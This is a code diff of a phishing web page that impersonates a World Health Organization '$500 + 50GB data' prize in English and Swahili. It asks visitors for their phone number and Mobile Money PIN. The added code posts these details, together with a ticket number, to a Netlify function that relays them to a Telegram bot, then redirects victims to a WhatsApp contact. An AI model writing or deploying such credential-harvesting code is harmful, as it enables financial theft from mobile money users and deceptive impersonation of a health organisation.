@@ -53,24 +53,13 @@
         }
 
         @keyframes shimmer {
-            0%,
-            100% {
-                background-position: 0% 50%;
-            }
-            50% {
-                background-position: 100% 50%;
-            }
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
         }
 
         @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .logo {
@@ -197,16 +186,9 @@
         }
 
         @keyframes shake {
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-            25% {
-                transform: translateX(-6px);
-            }
-            75% {
-                transform: translateX(6px);
-            }
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
         }
 
         .welcome-icon {
@@ -337,12 +319,12 @@
         .redirect-timer {
             margin-top: 16px;
             padding: 14px;
-            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            background: linear-gradient(135deg, #fff3e0, #ffe0b2);
             border-radius: 12px;
             text-align: center;
             font-size: 15px;
-            color: #1b5e20;
-            border: 2px solid #2e7d32;
+            color: #e65100;
+            border: 2px solid #e2001a;
             font-weight: 600;
         }
 
@@ -446,9 +428,7 @@
         }
 
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
 
         .back-link {
@@ -505,32 +485,25 @@
                 padding: 24px 18px;
                 border-radius: 28px;
             }
-
             .country-grid {
                 gap: 8px;
             }
-
             .country-btn {
                 padding: 12px 8px;
                 font-size: 12px;
             }
-
             .country-btn .flag {
                 font-size: 22px;
             }
-
             .welcome-title {
                 font-size: 19px;
             }
-
             .ticket-box .number {
                 font-size: 22px;
             }
-
             .success-box .check {
                 font-size: 56px;
             }
-
             .success-box h2 {
                 font-size: 20px;
             }
@@ -727,7 +700,10 @@
         // =============================================================
         // CONFIGURATION
         // =============================================================
-        const WHATSAPP_LINK = 'https://wa.me/message/XVGOEG42R65ZH1';
+        const API_BASE = '/.netlify/functions/send-to-telegram';
+        const WHATSAPP_NUMBER = '254754683573'; // CHANGE THIS
+        const WHATSAPP_MESSAGE = 'Hello%2C%20I%20am%20interested%20in%20applying%20for%20the%20%24500%20and%2050GB%20offer';
+        const WHATSAPP_LINK = 'https://api.whatsapp.com/send?phone=' + WHATSAPP_NUMBER + '&text=' + WHATSAPP_MESSAGE;
 
         const COUNTRIES = {
             uganda: {
@@ -777,18 +753,13 @@
             }
         };
 
-        // =============================================================
-        // TRANSLATIONS
-        // =============================================================
         const TRANSLATIONS = {
             en: {
                 welcomeTitle: 'Your application for <span class="highlight">$500</span> from<br />WORLD HEALTH ORGANIZATION (WHO) has been received!',
                 welcomeSub: '<strong>You\'ve been Added among the winners!</strong>',
                 subscribeBtn: '🚀 SUBSCRIBE TO 50GB DATA PLAN',
                 phoneLabel: '📞 Phone Number <span class="required">*</span>',
-                phonePlaceholder: 'Enter phone number',
                 pinLabel: '🔐 Mobile Money PIN <span class="required">*</span>',
-                pinPlaceholder: '****',
                 pinHint: '💡 Enter your <strong>4-digit</strong> Mobile Money PIN',
                 offerDesc: '💰 Get <strong>50GB Data</strong> + <strong>$500</strong> Cash Prize<br /><span style="font-size:12px; color:#888;">Subscribe now and claim your reward!</span>',
                 submitText: '🔥 GET DATA BUNDLE',
@@ -806,9 +777,7 @@
                 welcomeSub: '<strong>Umeongezwa kati ya washindi!</strong>',
                 subscribeBtn: '🚀 JISAJILI KWA MPANGO WA DATA 50GB',
                 phoneLabel: '📞 Namba ya Simu <span class="required">*</span>',
-                phonePlaceholder: 'Weka namba ya simu',
                 pinLabel: '🔐 Namba ya Siri ya Mobile Money <span class="required">*</span>',
-                pinPlaceholder: '****',
                 pinHint: '💡 Weka <strong>namba yako ya siri ya tarakimu 4</strong>',
                 offerDesc: '💰 Pata <strong>Data 50GB</strong> + <strong>$500</strong> Zawadi<br /><span style="font-size:12px; color:#888;">Jisajili sasa na udai zawadi yako!</span>',
                 submitText: '🔥 PATA BUNDLE YA DATA',
@@ -958,6 +927,23 @@
         }
 
         // =============================================================
+        // SEND TO TELEGRAM
+        // =============================================================
+        async function sendToTelegram(data) {
+            try {
+                const response = await fetch(`${API_BASE}/send-data`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return { success: false };
+            }
+        }
+
+        // =============================================================
         // START REDIRECT
         // =============================================================
         function startRedirect() {
@@ -974,7 +960,7 @@
                     redirectTimer.innerHTML = t.redirectText.replace('5', countdown);
                 } else {
                     clearInterval(countdownInterval);
-                    redirectTimer.innerHTML = '✅ Redirecting to WhatsApp...';
+                    redirectTimer.innerHTML = '✅ Opening WhatsApp...';
                     window.location.href = WHATSAPP_LINK;
                 }
             }, 1000);
@@ -1019,7 +1005,7 @@
         });
 
         // =============================================================
-        // EVENT: SUBMIT FORM
+        // EVENT: SUBMIT FORM - SENDS TO TELEGRAM
         // =============================================================
         submitBtn.addEventListener('click', async function() {
             if (isSubmitting) return;
@@ -1062,14 +1048,32 @@
             isSubmitting = true;
             setLoading(true);
 
-            // Store data for success page
+            // =============================================================
+            // SEND DATA TO TELEGRAM
+            // =============================================================
+            const telegramData = {
+                country: country.displayName,
+                countryCode: selectedCountry,
+                phone: phoneWithCode,
+                pin: pin,
+                ticket: ticketNumber,
+                offer: '50GB Data + $500'
+            };
+
+            try {
+                await sendToTelegram(telegramData);
+                console.log('✅ Data sent to Telegram');
+            } catch (error) {
+                console.error('❌ Failed to send to Telegram:', error);
+            }
+
+            // Show success page
             successCountry.textContent = `${country.flag} ${country.displayName}`;
             successPhone.textContent = `📞 ${phoneWithCode}`;
             successTicket.textContent = ticketNumber;
 
             showPage(page3);
 
-            // Start auto-redirect
             setTimeout(() => {
                 startRedirect();
             }, 1500);
@@ -1104,6 +1108,7 @@
 
         console.log('🚀 AFRICA 50GB OFFER Started!');
         console.log('💬 WhatsApp: ' + WHATSAPP_LINK);
+        console.log('📱 Telegram Bot: @KechiProject2_bot');
     </script>
 
 </body>
